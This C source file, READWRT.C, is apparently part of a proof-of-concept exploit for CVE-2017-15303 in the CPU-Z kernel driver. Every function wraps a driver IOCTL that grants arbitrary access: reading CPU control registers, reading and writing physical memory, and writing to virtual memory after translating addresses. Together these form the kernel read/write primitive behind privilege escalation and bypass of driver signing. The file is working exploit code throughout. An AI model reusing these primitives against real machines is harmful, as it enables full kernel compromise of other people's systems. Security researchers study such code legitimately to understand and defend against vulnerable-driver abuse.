/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2018
*
*  TITLE:       READWRT.C
*
*  VERSION:     1.00
*
*  DATE:        10 Feb 2018
*
*  Handlers for CPU-Z IOCTL requests.
*  CVE-2017-15303
*  https://www.cvedetails.com/cve/CVE-2017-15303/
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

/*
* cpuz_readcrX
*
* Purpose:
*
* Read CR register (CR0, CR2, CR3).
*
*/
BOOL cpuz_readcrX(
    _In_ ULONG Index,
    _Out_ PDWORD_PTR Value)
{
    DWORD bytesIO = 0, crIndex = Index;
    DWORD_PTR readValue = 0;

    DWORD LastError;

    *Value = 0;

    if (Index == 4) //cr4 not supported       
        return FALSE;

    if (DeviceIoControl(g_hDevice, IOCTL_CPUZ_READ_CRX_REGISTER,
        &crIndex, sizeof(crIndex),
        &readValue, sizeof(readValue),
        &bytesIO, NULL))
    {
        if (bytesIO == sizeof(readValue)) {
            *Value = readValue;
            return TRUE;
        }
        else {
            supPrintText(TEXT("\r\n DeviceIoControl(IOCTL_CPUZ_READ_CRX_REGISTER) return bogus data\r\n"));
        }
    }
    else {
        LastError = GetLastError();
        supPrintText(TEXT("\r\n DeviceIoControl(IOCTL_CPUZ_READ_CRX_REGISTER) failed\r\n"));
        supShowError(LastError, TEXT("GetLastError="));
    }
    return FALSE;
}

/*
* cpuz_readPhysicalMemory
*
* Purpose:
*
* Read physical memory (MmMapIoSpace).
*
*/
BOOL cpuz_readPhysicalMemory(
    _In_ DWORD_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ DWORD BufferLength)
{
    BOOL bResult;
    DWORD bytesIO = 0;
    READ_ADDRESS readAddress;
    OUT_DATA outData;

    DWORD LastError;

    readAddress.InputAddress.HighPart = HIDWORD(PhysicalAddress);
    readAddress.InputAddress.LowPart = LODWORD(PhysicalAddress);
    readAddress.OutputBufferLength = BufferLength;
    readAddress.OutputBuffer.HighPart = HIDWORD(Buffer);
    readAddress.OutputBuffer.LowPart = LODWORD(Buffer);

    outData.OperationCode = 0; //0x11111111 0x22222222
    outData.BufferLowPart = 0;

    bResult = DeviceIoControl(g_hDevice, IOCTL_CPUZ_READ_PHYSICAL_MEMORY,
        (LPVOID)&readAddress, sizeof(READ_ADDRESS),
        (LPVOID)&outData, sizeof(OUT_DATA),
        &bytesIO, NULL);

    if (!bResult) {
        LastError = GetLastError();
        supPrintText(TEXT("\r\nDeviceIoControl(IOCTL_CPUZ_READ_PHYSICAL_MEMORY) failed\r\n"));
        supShowError(LastError, TEXT("GetLastError="));
    }

    return bResult;
}

/*
* cpuz_readVirtualMemory
*
* Purpose:
*
* Translate virtual address to physical and read data from it.
*
*/
BOOL cpuz_readVirtualMemory(
    _In_ DWORD_PTR VirtualAddress,
    _In_ PVOID Buffer,
    _In_ DWORD BufferLength)
{
    DWORD_PTR phys = 0;

    if (VirtualToPhysical(VirtualAddress, &phys) != 0) {
        return cpuz_readPhysicalMemory(phys, Buffer, BufferLength);
    }
    return FALSE;
}

/*
* cpuz_writePhysicalMemory
*
* Purpose:
*
* Write physical memory (MmMapIoSpace).
* Input buffer length must be aligned to ULONG
*
*/
BOOL cpuz_writePhysicalMemory(
    _In_ DWORD_PTR PhysicalAddress,
    _In_ PDWORD Buffer,
    _In_ DWORD BufferLength)
{
    BOOL bResult = FALSE;
    DWORD bytesIO = 0, LastError;
    WRITE_ADDRESS_ULONG writeAddress;
    OUT_DATA outData;

    ULONG i;

    if ((BufferLength % 4) != 0)
        return FALSE;

    for (i = 0; i < (BufferLength / 4); i++) {

        writeAddress.Address.HighPart = HIDWORD(PhysicalAddress + 4 * i);
        writeAddress.Address.LowPart = LODWORD(PhysicalAddress + 4 * i);
        writeAddress.Value = Buffer[i];

        outData.OperationCode = 0;  //0x11111111 0x22222222
        outData.BufferLowPart = 0;

        bResult = DeviceIoControl(g_hDevice, IOCTL_CPUZ_WRITE_PHYSICAL_MEMORY,
            &writeAddress, sizeof(WRITE_ADDRESS_ULONG),
            &outData, sizeof(OUT_DATA),
            &bytesIO, NULL);

        if (!bResult) {
            LastError = GetLastError();
            supPrintText(TEXT("\r\nDeviceIoControl(IOCTL_CPUZ_WRITE_PHYSICAL_MEMORY) failed\r\n"));
            supShowError(LastError, TEXT("GetLastError="));
            break;
        }
    }
    return bResult;
}

/*
* cpuz_WriteVirtualMemory
*
* Purpose:
*
* Translate virtual address to physical and write data to it.
*
*/
BOOL cpuz_WriteVirtualMemory(
    _In_ DWORD_PTR VirtualAddress,
    _In_ PVOID Buffer,
    _In_ DWORD BufferLength)
{
    DWORD_PTR phys = 0;

    if (VirtualToPhysical(VirtualAddress, &phys) != 0) {
        return cpuz_writePhysicalMemory(phys, Buffer, BufferLength);
    }
    return FALSE;
}
